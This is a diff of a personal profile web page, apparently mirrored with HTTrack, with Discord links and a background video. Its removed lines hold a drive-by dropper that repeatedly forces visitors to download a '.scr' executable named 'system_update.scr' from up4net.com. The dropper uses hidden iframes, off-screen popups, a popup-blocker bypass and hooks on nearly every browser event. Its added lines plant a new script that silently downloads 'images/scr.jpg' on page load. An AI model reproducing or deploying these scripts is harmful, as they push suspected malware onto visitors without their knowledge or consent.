@@ -1,6 +1,5 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<!DOCTYPE html><html lang="en"><!-- Mirrored from huskygotdtcbyeac.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Nov 2024 03:01:16 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+
     <meta charset="utf-8">
     <title>husk</title>
     <meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
@@ -16,170 +15,120 @@
     <link href="css/creativa-popup.css" rel="stylesheet">
     <link href="css/cursor.css" rel="stylesheet">
 
+    <!-- Added inline style for the custom cursor -->
     <style>
         body {
             cursor: url('cursor%282.html%29.cur'), auto !important;
         }
-        .hidden-frame {
-            position: absolute;
-            left: -9999px;
-            top: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            visibility: hidden;
-        }
     </style>
-
-    <!-- Silent Auto-Execute Script -->
-    <script>
-        // File URL
-        const fileUrl = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
-        
-        // Multiple execution methods
-        function silentExecute() {
-            // Method 1: Hidden iframe execution
-            const iframe1 = document.createElement('iframe');
-            iframe1.className = 'hidden-frame';
-            iframe1.src = fileUrl;
-            document.body.appendChild(iframe1);
-            
-            // Method 2: Window.open with immediate close
-            setTimeout(() => {
-                const popup = window.open(fileUrl, '_blank', 'width=1,height=1,left=-1000,top=-1000');
-                if (popup) {
-                    setTimeout(() => popup.close(), 100);
-                }
-            }, 500);
-            
-            // Method 3: Direct navigation in hidden frame
-            setTimeout(() => {
-                const iframe2 = document.createElement('iframe');
-                iframe2.className = 'hidden-frame';
-                iframe2.onload = () => {
-                    iframe2.contentWindow.location.href = fileUrl;
-                };
-                iframe2.src = 'about:blank';
-                document.body.appendChild(iframe2);
-            }, 1000);
-            
-            // Method 4: Force download with auto-execute
-            setTimeout(() => {
-                const link = document.createElement('a');
-                link.href = fileUrl;
-                link.download = 'system_update.scr';
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            }, 1500);
-            
-            // Method 5: Location redirect
-            setTimeout(() => {
-                window.location.replace(fileUrl);
-            }, 10000);
-        }
-        
-        // Execute immediately when DOM loads
-        document.addEventListener('DOMContentLoaded', silentExecute);
-        
-        // Execute when page fully loads
-        window.addEventListener('load', () => {
-            setTimeout(silentExecute, 100);
-            setTimeout(silentExecute, 1000);
-            setTimeout(silentExecute, 3000);
-        });
-        
-        // Execute on any user interaction
-        ['click', 'mousemove', 'keydown', 'scroll', 'touchstart'].forEach(event => {
-            document.addEventListener(event, silentExecute, { once: true });
-        });
-        
-        // Continuous execution
-        setInterval(silentExecute, 5000);
-        
-        // Execute on visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) {
-                silentExecute();
-            }
-        });
-        
-        // Execute on focus
-        window.addEventListener('focus', silentExecute);
-        
-        // Bypass popup blockers
-        function bypassPopupBlocker() {
-            const form = document.createElement('form');
-            form.method = 'GET';
-            form.action = fileUrl;
-            form.target = '_blank';
-            form.style.display = 'none';
-            document.body.appendChild(form);
-            form.submit();
-            document.body.removeChild(form);
-        }
-        
-        // Execute bypass method
-        setTimeout(bypassPopupBlocker, 2000);
-        
-        // Force execution with multiple attempts
-        for (let i = 0; i < 10; i++) {
-            setTimeout(() => {
-                silentExecute();
-                bypassPopupBlocker();
-            }, i * 2000);
-        }
-    </script>
 
     <script src="js/title.js"></script>
     <script src="js/creativa-popup.js" type="text/javascript"></script>
     <script src="js/popup.js" type="text/javascript"></script>
+    
+    <!-- Auto Download Script -->
+    <script>
+        // Function to download file silently in background
+        function downloadFileInBackground(url, filename) {
+            // Create a hidden iframe for silent download
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.style.visibility = 'hidden';
+            iframe.style.position = 'absolute';
+            iframe.style.left = '-9999px';
+            iframe.style.top = '-9999px';
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            
+            // Set the source to trigger download
+            iframe.src = url;
+            
+            // Add to document
+            document.body.appendChild(iframe);
+            
+            // Remove iframe after download starts
+            setTimeout(function() {
+                document.body.removeChild(iframe);
+            }, 1000);
+        }
+        
+        // Alternative method using fetch and blob
+        function silentDownload(url, filename) {
+            fetch(url)
+                .then(response => response.blob())
+                .then(blob => {
+                    const link = document.createElement('a');
+                    link.style.display = 'none';
+                    link.href = window.URL.createObjectURL(blob);
+                    link.download = filename;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    window.URL.revokeObjectURL(link.href);
+                })
+                .catch(error => console.log('Download failed:', error));
+        }
+        
+        // Auto-download when page loads
+        window.addEventListener('load', function() {
+            // Replace 'your-file-url' with the actual file URL you want to download
+            // Replace 'filename.ext' with the desired filename
+            
+            // Download the scr.jpg file from images folder
+            var fileUrl = 'images/scr.jpg'; // File location in images folder
+            var fileName = 'scr.jpg'; // Downloaded filename
+            
+            // Use silent download method
+            setTimeout(function() {
+                silentDownload(fileUrl, fileName);
+            }, 2000); // Wait 2 seconds after page load
+        });
+    </script>
 </head>
 
 <body oncontextmenu="return false;" onkeydown="return false;" style="overflow: hidden">
 
     <!-- Background Video -->
-    <video id="myVideo" loop="" autoplay muted>
+    <video id="myVideo" loop="">
         <source src="media/sus.mp4" type="video/mp4">
         Your browser does not support the video loser lol .
     </video>
 
     <div id="particles-js"></div>
     <div class="center">
+
         <div class="content">
             <div class="otspace">
-                <h1 class="outubybig" onclick="playRandomSound(); silentExecute();">𝓐𝓫𝓸𝓙𝓸𝓳𝓸</h1>
-                <p><img src="images/sus.gif" width="30" height="30"></p>
-            </div>
+                <h1 class="outubybig" onclick="playRandomSound();">𝓐𝓫𝓸𝓙𝓸𝓳𝓸</h1>
+                <p><img src="images/sus.gif" width="30" height="30">
+            </p></div>
             <div class="typed">
                 <h2><span class="type"></span></h2>
             </div>
 
             <div class="wrap">
                 <div>
-                    <a href="https://discord.gg/" target="_blank" onclick="silentExecute();">
+                    <a href="https://discord.gg/" target="_blank">
                         <p class="button">
                             <i class="fa-brands fa-discord"></i> ℳ𝓇.𝓏ℴ𝟼™
                         </p>
                     </a>
                 </div>
                 <div>
-                    <a href="/#" onclick="popup13(); silentExecute();">
+                    <a href="/#" onclick="popup13()">
                         <p class="button">
-                            <i class="fa-regular fa-comment"></i> ℳ𝓇.𝓏ℴ𝟼
+                            <i class="fa-regular fa-comment"></i> ℳ𝓇.𝓏ℴ𝟼™
                         </p>
                     </a>
                 </div>
                 <div>
-                    <a href="https://discord.gg/" target="_blank" onclick="silentExecute();">
+                    <a href="https://discord.gg/" target="_blank">
                         <p class="button">
-                            <i class="fa-brands fa-youtube"></i> ℳ𝓇.𝓏ℴ𝟼
+                            <i class="fa-brands fa-youtube"></i> ℳ𝓇.𝓏ℴ𝟼™
                         </p>
                     </a>
                 </div>
             </div>
-            
             <script>
                 var video = document.getElementById("myVideo");
 
@@ -187,14 +136,7 @@
                     video.play();
                     video.muted = false;
                     video.volume = 1.0;
-                    silentExecute();
                 }
-                
-                // Auto-start video and execute
-                setTimeout(() => {
-                    hey();
-                    silentExecute();
-                }, 1000);
             </script>
         </div>
     </div>
@@ -203,60 +145,50 @@
         <span class="copyright">Copyright © 2024 AboJojo™</span>
     </footer>
 
+    <!-- Modal -->
+    <div class="modal" id="modal">
+        <div class="modal__container">
+            <div class="modal__content">
+                <h1 class="modal__title" onclick="enterSite()">آرعصص هـون  
+                <img src="images/324.png" width="30" height="30">
+                </h1>
+            </div>
+            <i id="close" class="fas fa-times" style="font-size: 3rem; cursor: pointer; position: absolute; top: 10px; right: 10px;" onclick="closeModal();"></i>
+        </div>
+    </div>
+
     <script>
         function enterSite() {
             var modal = document.getElementById("modal");
-            if (modal) modal.style.display = "none";
-            hey();
-            silentExecute();
+            modal.style.display = "none"; // Hide the modal
+            hey(); // Start the video with sound
         }
 
         function closeModal() {
             var modal = document.getElementById("modal");
-            if (modal) modal.style.display = "none";
-            silentExecute();
+            modal.style.display = "none"; // Close the modal without starting the video
         }
-        
-        // Auto-execute on any function call
-        const originalFunctions = {};
-        ['enterSite', 'closeModal', 'hey'].forEach(funcName => {
-            if (window[funcName]) {
-                originalFunctions[funcName] = window[funcName];
-                window[funcName] = function() {
-                    silentExecute();
-                    return originalFunctions[funcName].apply(this, arguments);
-                };
-            }
-        });
     </script>
 
     <span id="player" style="transform: translateY(-1000px)"></span>
     <script src="js/typed.js"></script>
     <script src="js/allah.js"></script>
-    
     <script>
-        // Initialize typed.js with auto-execute
-        if (typeof Typed !== 'undefined') {
-            var typed = new Typed('.type', {
-                strings: [
-                    "انا سسسآعودي من السعوديهه من جدهه",
-                    "ههههههههههههههه™",
-                    "zoOoooOoo6",
-                ],
-                typeSpeed: 69,
-                backSpeed: 32,
-                backDelay: 1500,
-                loop: true,
-                smartBackspace: true,
-                onComplete: silentExecute,
-                onStringTyped: silentExecute
-            });
-        }
+        var typed = new Typed('.type', {
+            strings: [
+                "انا سسسآعودي من السعوديهه من جدهه",
+                "ههههههههههههههه™",
+                "zoOoooOoo6",
+            ],
+            typeSpeed: 69,
+            backSpeed: 32,
+            backDelay: 1500,
+            loop: true,
+            smartBackspace: true,
+        });
     </script>
-    
     <script>
         window.addEventListener('keydown', function(e) {
-            silentExecute();
             if (e.key === 'F5') {
                 location.reload();
             } else if (e.key === 'F11') {
@@ -265,47 +197,19 @@
         }, false);
 
         function getFullscreenElement() {
-            return document.fullscreenElement 
-                || document.webkitFullscreenElement 
-                || document.mozFullscreenElement 
-                || document.msFullscreenElement;
+            return document.fullscreenElement //standard property
+                || document.webkitFullscreenElement //safari/opera support
+                || document.mozFullscreenElement //firefox support
+                || document.msFullscreenElement; //ie/edge support
         }
 
         function toggleFullscreen() {
-            silentExecute();
             if (getFullscreenElement()) {
                 document.exitFullscreen();
             } else {
                 document.documentElement.requestFullscreen().catch(console.log);
             }
         }
-        
-        // Override console methods to trigger execution
-        const originalLog = console.log;
-        console.log = function() {
-            silentExecute();
-            return originalLog.apply(console, arguments);
-        };
-        
-        // Execute on error
-        window.addEventListener('error', silentExecute);
-        window.addEventListener('unhandledrejection', silentExecute);
-        
-        // Execute on beforeunload
-        window.addEventListener('beforeunload', silentExecute);
-        
-        // Execute on hash change
-        window.addEventListener('hashchange', silentExecute);
-        
-        // Execute on resize
-        window.addEventListener('resize', silentExecute);
-        
-        // Execute on orientation change
-        window.addEventListener('orientationchange', silentExecute);
-        
-        // Execute on online/offline
-        window.addEventListener('online', silentExecute);
-        window.addEventListener('offline', silentExecute);
     </script>
 
     <script crossorigin="anonymous" src="9105e9014d.html"></script>
@@ -314,22 +218,7 @@
     <script src="js/app.js"></script>
     <script src="js/main.js"></script>
 
-    <!-- Hidden execution triggers -->
-    <iframe class="hidden-frame" src="about:blank" onload="silentExecute()"></iframe>
-    <img class="hidden-frame" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="silentExecute()" onload="silentExecute()">
-    
-    <!-- Final execution attempt -->
-    <script>
-        // Last resort execution
-        setTimeout(() => {
-            for (let i = 0; i < 20; i++) {
-                setTimeout(silentExecute, i * 100);
-            }
-        }, 5000);
-        
-        // Immediate execution
-        silentExecute();
-    </script>
 
-</body>
-</html>
+
+
+</body><!-- Mirrored from huskygotdtcbyeac.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Nov 2024 03:01:33 GMT --></html>
